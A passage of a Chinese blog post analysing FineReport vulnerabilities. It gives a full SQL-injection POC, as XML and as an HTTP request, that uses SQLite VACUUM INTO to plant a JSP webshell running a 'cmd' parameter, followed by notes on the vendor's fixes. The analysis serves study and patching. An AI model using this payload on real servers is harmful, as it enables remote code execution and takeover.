GeneralXMLTools.writeXMLableAsString(largeDatasetExcelExportJavaScript);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>之前通过U+FEFF的绕过已经被修复了，这里要介绍使用vacuum命令进行写文件。</p>
+<p>在这之前，要知道新版本的黑名单中去除了一些关键词，看一下11.5.4.1（10.20号修复后）的关键词：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773553424037-a1bbbac2-ed6f-4fb5-8afa-75195ae4e800.png"  alt="img"></p>
+<p>原本的create，delete，drop等都不在黑名单里了。</p>
+<p>问一下AI，看看vacuum怎么用：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773199585220-18d13e60-a36e-4d08-b99d-3bc80225011d.png"  alt="img"></p>
+<p>这里搬运一下killer师傅的payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PRAGMA writable_schema <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> sq1ite_master <span class="keyword">WHERE</span> type <span class="keyword">IN</span> (<span class="string">&#x27;table&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;trigger&#x27;</span>);</span><br><span class="line">PRAGMA writable_schema <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">VACUUM;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> testxxx <span class="keyword">AS</span> <span class="keyword">SELECT</span> x<span class="string">&#x27;shellhex&#x27;</span> <span class="keyword">AS</span> id;</span><br><span class="line">VACUUM <span class="keyword">INTO</span> &quot;../webapps/webroot/shell.jsp&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>前面四行：直接导出数据库，作为jsp解析的话，由于数据库中有很多特殊字符，会导致jsp无法正常解析，所以需要先清除数据库再写入。默认的FRDEMO是测试数据库，删除了也没事，但还是建议备份一下。在第一行加入备份语句即可：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VACUUM <span class="keyword">INTO</span> &quot;frdemo.db.bak&quot;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">R</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Parameters</span> <span class="attr">a</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Attributes</span> <span class="attr">name</span>=<span class="string">&quot;p0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Attributes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Object</span> <span class="attr">t</span>=<span class="string">&quot;Formula&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Attributes</span>&gt;</span>sql(&#x27;FRDemo&#x27;,DECODE(&#x27;VACUUM+INTO+%27.%2Ffrdemo.db.bak%27%3B&#x27;),1,1)<span class="tag">&lt;/<span class="name">Attributes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Object</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Attributes</span> <span class="attr">name</span>=<span class="string">&quot;p1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Attributes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Object</span> <span class="attr">t</span>=<span class="string">&quot;Formula&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Attributes</span>&gt;</span>sql(&#x27;FRDemo&#x27;,DECODE(&#x27;PRAGMA+writable_schema%3D1%3B&#x27;),1,1)-sql(&#x27;FRDemo&#x27;,&quot;delete from sqlite_schema&quot;,1,1)<span class="tag">&lt;/<span class="name">Attributes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Object</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Attributes</span> <span class="attr">name</span>=<span class="string">&quot;p2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Attributes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Object</span> <span class="attr">t</span>=<span class="string">&quot;Formula&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Attributes</span>&gt;</span>sql(&#x27;FRDemo&#x27;,DECODE(&#x27;CREATE+TABLE+t1+%28p+text%29%3B%29&#x27;),1,1)-sql(&#x27;FRDemo&#x27;,DECODE(&#x27;REPLACE+INTO+t1+VALUES+%28%27%3C%25+Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29%3B+%25%3E%27%29%3B%29&#x27;),1,1)-sql(&#x27;FRDemo&#x27;,&quot;COMMIT&quot;,1)-sql(&#x27;FRDemo&#x27;,DECODE(&#x27;VACUUM+INTO+%27..%2Fwebapps%2Fwebroot%2Fwaibiwaibi.jsp%27%3B&#x27;),1,1)<span class="tag">&lt;/<span class="name">Attributes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Object</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Parameters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LargeDatasetExcelExportJS</span> <span class="attr">exportFileName</span>=<span class="string">&quot;waibiwaibi&quot;</span> <span class="attr">dsName</span>=<span class="string">&quot;ds1&quot;</span> <span class="attr">colNames</span>=<span class="string">&quot;&#123;&#125;&quot;</span> <span class="attr">exportFormat</span>=<span class="string">&quot;excel&quot;</span> <span class="attr">encodeFormat</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">R</span>&gt;</span></span><br><span class="line">GET /webroot/decision/nx/report/v9/largedataset/export/excel HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8075</span><br><span class="line">sessionID: e46cd7cc-781d-4dd0-8aa9-0f986bfc8065</span><br><span class="line">params: %3CR%3E%3CParameters+a%3D%221%22%3E%3CParameter%3E%3CAttributes+name%3D%22p0%22%3E%3C%2FAttributes%3E%3CObject+t%3D%22Formula%22%3E%3CAttributes%3Esql%28%27FRDemo%27%2CDECODE%28%27VACUUM%2BINTO%2B%2527.%252Ffrdemo1.db.bak%2527%253B%27%29%2C1%2C1%29%3C%2FAttributes%3E%3C%2FObject%3E%3C%2FParameter%3E%3CParameter%3E%3CAttributes+name%3D%22p1%22%3E%3C%2FAttributes%3E%3CObject+t%3D%22Formula%22%3E%3CAttributes%3Esql%28%27FRDemo%27%2CDECODE%28%27PRAGMA%2Bwritable_schema%253D1%253B%27%29%2C1%2C1%29-sql%28%27FRDemo%27%2C%22delete+from+sqlite_schema%22%2C1%2C1%29%3C%2FAttributes%3E%3C%2FObject%3E%3C%2FParameter%3E%3CParameter%3E%3CAttributes+name%3D%22p2%22%3E%3C%2FAttributes%3E%3CObject+t%3D%22Formula%22%3E%3CAttributes%3Esql%28%27FRDemo%27%2CDECODE%28%27CREATE%2BTABLE%2Bt1%2B%2528p%2Btext%2529%253B%2529%27%29%2C1%2C1%29-sql%28%27FRDemo%27%2CDECODE%28%27REPLACE%2BINTO%2Bt1%2BVALUES%2B%2528%2527%253C%2525%2BRuntime.getRuntime%2528%2529.exec%2528request.getParameter%2528%2522cmd%2522%2529%2529%253B%2B%2525%253E%2527%2529%253B%2529%27%29%2C1%2C1%29-sql%28%27FRDemo%27%2C%22COMMIT%22%2C1%29-sql%28%27FRDemo%27%2CDECODE%28%27VACUUM%2BINTO%2B%2527..%252Fwebapps%252Fwebroot%252Fwaibiwaibi.jsp%2527%253B%27%29%2C1%2C1%29%3C%2FAttributes%3E%3C%2FObject%3E%3C%2FParameter%3E%3C%2FParameters%3E%3CLargeDatasetExcelExportJS+exportFileName%3D%22waibiwaibi%22+dsName%3D%22ds1%22+colNames%3D%22%7B%7D%22+exportFormat%3D%22excel%22+encodeFormat%3D%22UTF-8%22%2F%3E%3C%2FR%3E</span><br><span class="line">__parameters__: &#123;&#125;</span><br><span class="line">functionParams: &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是很尴尬的一点是，我这里11.0.28版本会禁create，delete等，11.5.4.1不仅修复了最新的sessionID获取，又禁了vacuum。所以漏洞没法在本地复现。</p>
+<h2 id="官方修复-2"><a href="#官方修复-2" class="headerlink" title="官方修复"></a>官方修复</h2><p>vacuum在最新版本的修复中被加入黑名单：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773553192771-27718ca9-1252-4221-b9a3-105d4942ef53.png"  alt="img"></p>
+<p>另外，关于sessionID：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773564355108-e3dc7feb-bfe1-4b76-af95-cbc11ccef7aa.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773564389802-32145a57-6853-48d3-8dd8-40104b6d6d99.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773564655368-f1b03a8d-5771-40b7-b44d-874446243845.png"  alt="img"></p>
+<p>会判断op是否为closesessionid或getSessionID，会判断是否请求的是 &#x2F;decision，不是的话转发到&#x2F;view&#x2F;report。同时，checkRequest：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773565205075-01a22cb5-3c8b-4ea1-83c3-7f0dbc03987d.png"  alt="img"></p>
+<p>这个list不再为空，导致var9变成true，这个解析过程可以自行调试一下。</p>
+<p>原本文章里<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90947" >https://xz.aliyun.com/news/90947<i class="fas fa-external-link-alt"></i></a> ，list是空的。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>由于篇幅和本人学习进度原因，这里还有几个漏洞没分析。</p>
+<p>1、&#x2F;remote&#x2F;design&#x2F;channel 反序列化  有三次绕过</p>
+<p>绕过1：TreeBag + ClassComparator + VersionComparator + JSONArray 未知具体修复版本，反正V10最后一个版本已经修复-2024.3.19-10.0.19；V11-2024.7.17-11.0.28已经修复（非最早修复版本）</p>
+<p>绕过2：HashMap + HashTable + UIDefaults$TextAndMnemonicHashMap + JSONArray V10全没修；V11-2024.7.17-11.0.28已修复（非最早修复版本）</p>
+<p>绕过3：ImmutableSetMultimap + JSONArray  V11-2025.3.31-11.0.32修复？</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/2806" >https://forum.butian.net/share/2806<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14869" >https://xz.aliyun.com/news/14869<i class="fas fa-external-link-alt"></i></a></p>
+<p>2、FVS插件的漏洞</p>
+<p>3、几个任意文件读取漏洞</p>
+<p>后面有空也许写有第二篇。</p>
+<p>这次分析大概花费了一周多，对这种大型的系统，分析还是有很多不熟练的地方，后面要多多练习。</p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>主要记录一些官方文档的位置：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finereport/doc-view-4833.html" >https://help.fanruan.com/finereport/doc-view-4833.html<i class="fas fa-external-link-alt"></i></a>    安全漏洞声明</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finereport/doc-view-3930.html" >https://help.fanruan.com/finereport/doc-view-3930.html<i class="fas fa-external-link-alt"></i></a>    设计器函数汇总</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finereport/doc-view-4699.html" >https://help.fanruan.com/finereport/doc-view-4699.html<i class="fas fa-external-link-alt"></i></a>  FineReport更新文档</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finebi6.X/doc-view-2355.html" >https://help.fanruan.com/finebi6.X/doc-view-2355.html<i class="fas fa-external-link-alt"></i></a>   FineBI更新文档</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finedatalink/doc-view-751.html" >https://help.fanruan.com/finedatalink/doc-view-751.html<i class="fas fa-external-link-alt"></i></a>    FineDataLink更新文档</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/628UNSos2lxNy5QUCLRznA" >https://mp.weixin.qq.com/s/628UNSos2lxNy5QUCLRznA<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14625" >https://xz.aliyun.com/news/14625<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/" >https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90947" >https://xz.aliyun.com/news/90947<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90898" >https://xz.aliyun.com/news/90898<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                帆软FineReport历史漏洞分析（一）
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2026/03/15/帆软FineReport历史漏洞分析（一）/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2026-03-15 19:17</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/03/06/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/"
+                                   title="Hessian反序列化整理"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Hessian反序列化整理</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84%E7%AE%80%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">项目结构简析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E6%95%99%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">调试教程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="nav-number">3.1.</span> <span class="nav-text">远程调试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E5%8C%BA%E5%88%86"><span class="nav-number">4.</span> <span class="nav-text">版本区分</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Servlet%E6%B3%A8%E5%86%8C%E9%80%BB%E8%BE%91"><span class="nav-number">5.</span> <span class="nav-text">Servlet注册逻辑</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#servlet%E6%B3%A8%E5%86%8C"><span class="nav-number">5.1.</span> <span class="nav-text">servlet注册</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#activator%E6%B3%A8%E5%86%8C"><span class="nav-number">5.2.</span> <span class="nav-text">activator注册</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97"><span class="nav-number">5.2.1.</span> <span class="nav-text">配置文件加载模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#start%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">5.2.2.</span> <span class="nav-text">start初始化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="nav-number">6.</span> <span class="nav-text">路由分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Servlet"><span class="nav-number">6.1.</span> <span class="nav-text">Servlet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dispatcher"><span class="nav-number">6.2.</span> <span class="nav-text">Dispatcher</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#webroot-ReportServer"><span class="nav-number">6.2.1.</span> <span class="nav-text">&#x2F;webroot&#x2F;ReportServer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#webroot-decision-view-report"><span class="nav-number">6.2.2.</span> <span class="nav-text">&#x2F;webroot&#x2F;decision&#x2F;view&#x2F;report</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#print-ie-pdf-SQL%E6%B3%A8%E5%85%A5%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">7.</span> <span class="nav-text">&#x2F;print&#x2F;ie&#x2F;pdf  SQL注入写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">7.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">7.2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%81%B6%E6%84%8F%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%8E%B7%E5%8F%96"><span class="nav-number">7.2.1.</span> <span class="nav-text">恶意表达式获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">7.2.2.</span> <span class="nav-text">SQL注入写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">7.2.2.1.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E7%BB%95%E8%BF%87"><span class="nav-number">7.2.3.</span> <span class="nav-text">SQL绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">7.3.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D"><span class="nav-number">7.4.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#view-ReportServer-SQL%E6%B3%A8%E5%85%A5%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">8.</span> <span class="nav-text">&#x2F;view&#x2F;ReportServer? SQL注入写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">8.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">8.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-1"><span class="nav-number">8.3.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">8.4.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#export-excel-SQL%E6%B3%A8%E5%85%A5%E5%86%99webshell"><span class="nav-number">9.</span> <span class="nav-text">export&#x2F;excel SQL注入写webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="nav-number">9.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-number">9.2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sessionID%E8%8E%B7%E5%8F%96"><span class="nav-number">9.2.1.</span> <span class="nav-text">sessionID获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML%E6%A0%BC%E5%BC%8F%E6%8E%A8%E5%AF%BC"><span class="nav-number">9.2.2.</span> <span class="nav-text">XML格式推导</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%85%A5webshell"><span class="nav-number">9.2.3.</span> <span class="nav-text">写入webshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-2"><span class="nav-number">9.3.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">9.4.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">10.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">11.</span> <span class="nav-text">附录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">12.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2025</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">162.2k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
